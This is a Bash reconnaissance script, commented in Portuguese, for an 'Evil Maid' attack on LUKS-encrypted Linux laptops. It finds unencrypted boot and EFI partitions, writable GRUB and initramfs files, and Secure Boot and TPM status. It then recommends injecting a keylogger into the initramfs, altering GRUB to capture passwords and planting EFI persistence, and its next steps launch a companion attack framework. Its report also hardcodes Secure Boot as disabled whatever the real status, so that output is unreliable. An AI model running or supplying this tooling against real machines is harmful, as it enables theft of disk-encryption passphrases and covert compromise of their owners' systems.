#!/bin/bash
# reconnaissance.sh - Identificação e montagem das partições alvo
# Evil Maid Pentest - Fase de Reconhecimento
# Uso: sudo ./reconnaissance.sh

set -e

# Configuração de cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
show_banner() {
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                        Evil Maid Reconnaissance Script                        ║"
    echo "║                       LUKS FDE Penetration Testing                           ║"
    echo "║                                                                              ║"
    echo "║  ⚠️  WARNING: For authorized security testing only                          ║"
    echo "║  📡 Phase: Target identification and vulnerability assessment               ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Função para logging
log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")  echo -e "${GREEN}[INFO]${NC} $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC} $message" ;;
        "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
        "DEBUG") echo -e "${BLUE}[DEBUG]${NC} $message" ;;
    esac
    
    # Log para arquivo
    echo "[$timestamp] [$level] $message" >> "/tmp/evil_maid_recon.log"
}

# Verificar privilégios root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log "ERROR" "Este script requer privilégios de root para acessar dispositivos de bloco"
        echo -e "${RED}Execute com: sudo $0${NC}"
        exit 1
    fi
}

# Detectar arquitetura do sistema
detect_architecture() {
    log "INFO" "Detectando arquitetura do sistema..."
    
    local arch=$(uname -m)
    local kernel=$(uname -r)
    local os=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d'"' -f2 2>/dev/null || echo "Unknown")
    
    echo -e "\n${GREEN}[+] Informações do Sistema:${NC}"
    echo "    Arquitetura: $arch"
    echo "    Kernel: $kernel"
    echo "    OS: $os"
    
    # Detectar método de boot (UEFI vs BIOS)
    if [ -d "/sys/firmware/efi" ]; then
        echo "    Boot Method: UEFI"
        log "INFO" "Sistema utiliza UEFI"
    else
        echo "    Boot Method: BIOS (Legacy)"
        log "INFO" "Sistema utiliza BIOS Legacy"
    fi
    
    # Verificar Secure Boot
    if [ -f "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c" ]; then
        local secureboot_status=$(hexdump -C /sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c 2>/dev/null | tail -1 | cut -d' ' -f18)
        if [ "$secureboot_status" = "01" ]; then
            echo "    Secure Boot: ENABLED (⚠️ May block attack)"
            log "WARN" "Secure Boot está habilitado - isso pode impedir alguns ataques"
        else
            echo "    Secure Boot: DISABLED (✓ Vulnerable)"
            log "INFO" "Secure Boot desabilitado - sistema vulnerável"
        fi
    else
        echo "    Secure Boot: Not Available/BIOS"
    fi
    
    # Verificar TPM
    if [ -e "/dev/tpm0" ] || [ -e "/dev/tpmrm0" ] || [ -d "/sys/class/tpm/tpm0" ]; then
        echo "    TPM: PRESENT (🔒 Additional security layer)"
        log "INFO" "TPM detectado no sistema"
    else
        echo "    TPM: NOT DETECTED"
    fi
}

# Identificar dispositivos de armazenamento
identify_storage_devices() {
    log "INFO" "Identificando dispositivos de armazenamento..."
    
    echo -e "\n${GREEN}[+] Dispositivos de Bloco Disponíveis:${NC}"
    
    # Listar todos os dispositivos
    lsblk -f | while read line; do
        echo "    $line"
    done
    
    echo -e "\n${GREEN}[+] Informações Detalhadas dos Discos:${NC}"
    
    # Informações detalhadas com fdisk
    fdisk -l 2>/dev/null | grep -E "Disk /|/dev/" | head -20 | while read line; do
        if [[ $line == Disk* ]]; then
            echo "    💾 $line"
        else
            echo "       └─ $line"
        fi
    done
    
    # Identificar partições não criptografadas
    echo -e "\n${GREEN}[+] Partições Não Criptografadas (Alvos Potenciais):${NC}"
    
    local vulnerable_found=false
    
    for dev in $(lsblk -lnpo NAME,FSTYPE | grep -E "vfat|ext4|ext3|ext2|ntfs|fat32" | grep -v "squashfs" | awk '{print $1}'); do
        if ! mount | grep -q "$dev"; then
            local fstype=$(lsblk -lnpo FSTYPE "$dev" 2>/dev/null)
            local size=$(lsblk -lnpo SIZE "$dev" 2>/dev/null)
            local label=$(blkid -s LABEL -o value "$dev" 2>/dev/null)
            
            echo "    🔓 Dispositivo: $dev"
            echo "       ├─ Filesystem: $fstype"
            echo "       ├─ Tamanho: $size"
            echo "       └─ Label: ${label:-"N/A"}"
            
            log "INFO" "Partição vulnerável encontrada: $dev ($fstype, $size)"
            vulnerable_found=true
            
            # Verificar se é partição EFI/ESP
            if [[ $fstype == "vfat" ]] && { [[ $label == *"EFI"* ]] || blkid "$dev" | grep -q "ESP"; }; then
                echo "       ⭐ PARTIÇÃO EFI DETECTADA - Alvo de alta prioridade!"
                log "WARN" "Partição EFI encontrada em $dev - alvo crítico"
            fi
            
            echo ""
        fi
    done
    
    if ! $vulnerable_found; then
        log "WARN" "Nenhuma partição não criptografada encontrada"
        echo "    ⚠️  Nenhuma partição vulnerável detectada"
    fi
}

# Detectar dispositivos LUKS
detect_luks_devices() {
    log "INFO" "Detectando dispositivos LUKS criptografados..."
    
    echo -e "\n${GREEN}[+] Dispositivos LUKS Detectados:${NC}"
    
    local luks_found=false
    
    # Usar blkid para encontrar dispositivos LUKS
    for device in $(blkid -t TYPE=crypto_LUKS -o device 2>/dev/null); do
        luks_found=true
        echo "    🔒 Dispositivo LUKS: $device"
        
        # Analisar cabeçalho LUKS
        if command -v cryptsetup >/dev/null 2>&1; then
            local luks_info=$(cryptsetup luksDump "$device" 2>/dev/null | head -20)
            
            # Extrair versão LUKS
            local version=$(echo "$luks_info" | grep "Version:" | awk '{print $2}')
            echo "       ├─ Versão LUKS: ${version:-"Unknown"}"
            
            # Verificar algoritmo de hash
            local hash_spec=$(echo "$luks_info" | grep "Hash spec:" | awk '{print $3}')
            echo "       ├─ Hash: ${hash_spec:-"Unknown"}"
            
            # Verificar KDF (Key Derivation Function)
            local cipher=$(echo "$luks_info" | grep "Cipher:" | awk '{print $2}')
            echo "       ├─ Cipher: ${cipher:-"Unknown"}"
            
            # Verificar slots de chave
            local active_slots=$(cryptsetup luksDump "$device" 2>/dev/null | grep "Key Slot [0-7]: ENABLED" | wc -l)
            echo "       └─ Slots Ativos: $active_slots/8"
            
            log "INFO" "Dispositivo LUKS: $device (v$version, $active_slots slots ativos)"
            
            # Verificar se é LUKS1 (mais vulnerável a ataques GPU)
            if [[ $version == "1" ]]; then
                echo "       ⚠️  LUKS1 - Vulnerável a ataques de força bruta GPU!"
                log "WARN" "LUKS1 detectado em $device - vulnerável a GPU bruteforce"
            fi
        else
            log "ERROR" "cryptsetup não disponível para análise detalhada"
        fi
        
        echo ""
    done
    
    if ! $luks_found; then
        echo "    ℹ️  Nenhum dispositivo LUKS detectado"
        log "INFO" "Nenhum dispositivo LUKS encontrado"
    fi
}

# Analisar configuração de boot
analyze_boot_configuration() {
    log "INFO" "Analisando configuração de boot..."
    
    echo -e "\n${GREEN}[+] Análise da Configuração de Boot:${NC}"
    
    # Verificar GRUB
    local grub_configs=("/boot/grub/grub.cfg" "/boot/grub2/grub.cfg")
    local grub_found=false
    
    for grub_config in "${grub_configs[@]}"; do
        if [[ -f "$grub_config" ]]; then
            grub_found=true
            echo "    📄 GRUB Config: $grub_config"
            
            # Verificar proteção por senha
            if grep -q "password" "$grub_config" 2>/dev/null; then
                echo "       ├─ Proteção por senha: SIM (🔒 Protegido)"
                log "INFO" "GRUB protegido por senha"
            else
                echo "       ├─ Proteção por senha: NÃO (⚠️ Vulnerável)"
                log "WARN" "GRUB não protegido por senha"
            fi
            
            # Verificar suporte a LUKS
            if grep -q -E "(luks|cryptomount)" "$grub_config" 2>/dev/null; then
                echo "       ├─ Suporte LUKS: SIM"
                log "INFO" "GRUB com suporte LUKS detectado"
            else
                echo "       ├─ Suporte LUKS: NÃO"
            fi
            
            # Verificar permissões de escrita
            if [[ -w "$grub_config" ]]; then
                echo "       └─ Permissões de escrita: SIM (⚠️ Modificável)"
                log "WARN" "GRUB config modificável"
            else
                echo "       └─ Permissões de escrita: NÃO (🔒 Protegido)"
            fi
            
            break
        fi
    done
    
    if ! $grub_found; then
        echo "    ❌ Configuração GRUB não encontrada"
        log "ERROR" "Nenhuma configuração GRUB detectada"
    fi
    
    # Verificar initramfs
    local initramfs_files=("/boot/initrd.img" "/boot/initrd.img-$(uname -r)" "/boot/initramfs.img")
    local initramfs_found=false
    
    echo -e "\n    💾 Análise do Initramfs:"
    
    for initramfs_file in "${initramfs_files[@]}"; do
        if [[ -f "$initramfs_file" ]]; then
            initramfs_found=true
            echo "       📦 Initramfs: $initramfs_file"
            
            local file_size=$(du -h "$initramfs_file" | cut -f1)
            echo "          ├─ Tamanho: $file_size"
            
            # Detectar compressão
            local file_type=$(file "$initramfs_file" | cut -d: -f2)
            echo "          ├─ Tipo: $file_type"
            
            # Verificar permissões
            if [[ -w "$initramfs_file" ]]; then
                echo "          └─ Modificável: SIM (⚠️ Vulnerável)"
                log "WARN" "Initramfs modificável: $initramfs_file"
            else
                echo "          └─ Modificável: NÃO (🔒 Protegido)"
            fi
            
            break
        fi
    done
    
    if ! $initramfs_found; then
        echo "       ❌ Initramfs não encontrado"
        log "ERROR" "Nenhum initramfs detectado"
    fi
}

# Criar estrutura de diretórios para montagem
create_mount_structure() {
    log "INFO" "Criando estrutura de diretórios para montagem..."
    
    local base_mount="/mnt/evil_target"
    
    # Criar pontos de montagem
    mkdir -p "${base_mount}/boot"
    mkdir -p "${base_mount}/jvm"
    mkdir -p "${base_mount}/temp"
    mkdir -p "${base_mount}/analysis"
    
    echo -e "\n${GREEN}[+] Estrutura de Montagem Criada:${NC}"
    echo "    📁 Base: $base_mount"
    echo "    ├─ boot/     - Para partição de boot/EFI"
    echo "    ├─ jvm/      - Para partição de módulos JVM"
    echo "    ├─ temp/     - Para análise temporária"
    echo "    └─ analysis/ - Para resultados de análise"
    
    log "INFO" "Diretórios criados em $base_mount"
}

# Gerar relatório de reconhecimento
generate_reconnaissance_report() {
    local report_file="/tmp/evil_maid_reconnaissance_$(date +%s).json"
    
    log "INFO" "Gerando relatório de reconhecimento..."
    
    # Coleta informações do sistema
    local hostname=$(hostname)
    local kernel_version=$(uname -r)
    local architecture=$(uname -m)
    local boot_method="BIOS"
    
    if [[ -d "/sys/firmware/efi" ]]; then
        boot_method="UEFI"
    fi
    
    # Detectar partições vulneráveis
    local vulnerable_partitions=()
    for dev in $(lsblk -lnpo NAME,FSTYPE | grep -E "vfat|ext4|ext3|ext2|ntfs" | awk '{print $1}'); do
        if ! mount | grep -q "$dev" 2>/dev/null; then
            vulnerable_partitions+=("$dev")
        fi
    done
    
    # Detectar dispositivos LUKS
    local luks_devices=()
    for device in $(blkid -t TYPE=crypto_LUKS -o device 2>/dev/null); do
        luks_devices+=("$device")
    done
    
    # Gerar JSON
    cat > "$report_file" << EOF
{
  "reconnaissance_report": {
    "timestamp": "$(date -Iseconds)",
    "system_info": {
      "hostname": "$hostname",
      "kernel_version": "$kernel_version", 
      "architecture": "$architecture",
      "boot_method": "$boot_method",
      "secure_boot_enabled": false,
      "tpm_present": $([ -e "/dev/tpm0" ] && echo "true" || echo "false")
    },
    "storage_analysis": {
      "vulnerable_partitions": [
$(printf '        "%s",\n' "${vulnerable_partitions[@]}" | sed '$ s/,$//')
      ],
      "luks_devices": [
$(printf '        "%s",\n' "${luks_devices[@]}" | sed '$ s/,$//')
      ]
    },
    "attack_surface": {
      "grub_modifiable": $([ -w "/boot/grub/grub.cfg" ] && echo "true" || echo "false"),
      "initramfs_modifiable": $([ -w "/boot/initrd.img" ] && echo "true" || echo "false"),
      "efi_partition_accessible": $(lsblk -f | grep -q "vfat.*EFI" && echo "true" || echo "false")
    },
    "recommendations": [
      "Mount vulnerable partitions for analysis",
      "Inject keylogger into initramfs if modifiable",
      "Modify GRUB configuration if writable",
      "Target EFI partition for persistence if available"
    ]
  }
}
EOF
    
    echo -e "\n${GREEN}[+] Relatório de Reconhecimento Gerado:${NC}"
    echo "    📄 Arquivo: $report_file"
    echo "    📊 Partições vulneráveis: ${#vulnerable_partitions[@]}"
    echo "    🔒 Dispositivos LUKS: ${#luks_devices[@]}"
    
    log "INFO" "Relatório salvo em: $report_file"
    
    # Mostrar resumo dos alvos mais promissores
    echo -e "\n${YELLOW}[!] ALVOS DE MAIOR PRIORIDADE:${NC}"
    
    local priority_targets=false
    
    # EFI partition
    if lsblk -f | grep -q "vfat.*EFI"; then
        echo "    🎯 Partição EFI detectada - Alvo crítico para persistência"
        priority_targets=true
    fi
    
    # Writable GRUB
    if [[ -w "/boot/grub/grub.cfg" ]] || [[ -w "/boot/grub2/grub.cfg" ]]; then
        echo "    🎯 GRUB modificável - Possível captura de senha"
        priority_targets=true
    fi
    
    # Writable initramfs  
    for initramfs in "/boot/initrd.img" "/boot/initrd.img-$(uname -r)"; do
        if [[ -w "$initramfs" ]]; then
            echo "    🎯 Initramfs modificável - Injeção de keylogger possível"
            priority_targets=true
            break
        fi
    done
    
    if ! $priority_targets; then
        echo "    ⚠️  Nenhum alvo de alta prioridade identificado"
        echo "    💡 Sistema pode estar bem protegido ou requer escalação de privilégios"
    fi
}

# Mostrar próximos passos
show_next_steps() {
    echo -e "\n${BLUE}[📋] PRÓXIMOS PASSOS SUGERIDOS:${NC}"
    echo ""
    echo "1. 📁 Montar partições alvo:"
    echo "   sudo mount /dev/sdX1 /mnt/evil_target/boot"
    echo "   sudo mount /dev/sdX2 /mnt/evil_target/jvm"
    echo ""
    echo "2. 🔍 Executar análise específica:"
    echo "   python3 ../evil_maid_framework.py analyze --boot-device /dev/sdX1"
    echo ""
    echo "3. ⚔️  Executar ataque completo:"
    echo "   python3 ../evil_maid_framework.py attack --boot-device /dev/sdX1 --jvm-device /dev/sdX2"
    echo ""
    echo "4. 📊 Coletar resultados após reboot do alvo:"
    echo "   python3 ../evil_maid_framework.py collect"
    echo ""
    echo -e "${RED}⚠️  LEMBRETE: Use apenas em sistemas autorizados!${NC}"
}

# Função principal
main() {
    show_banner
    
    check_root
    
    log "INFO" "Iniciando reconhecimento Evil Maid"
    
    detect_architecture
    identify_storage_devices  
    detect_luks_devices
    analyze_boot_configuration
    create_mount_structure
    generate_reconnaissance_report
    show_next_steps
    
    echo -e "\n${GREEN}✅ Reconhecimento completado com sucesso!${NC}"
    log "INFO" "Reconhecimento finalizado"
}

# Executar se chamado diretamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi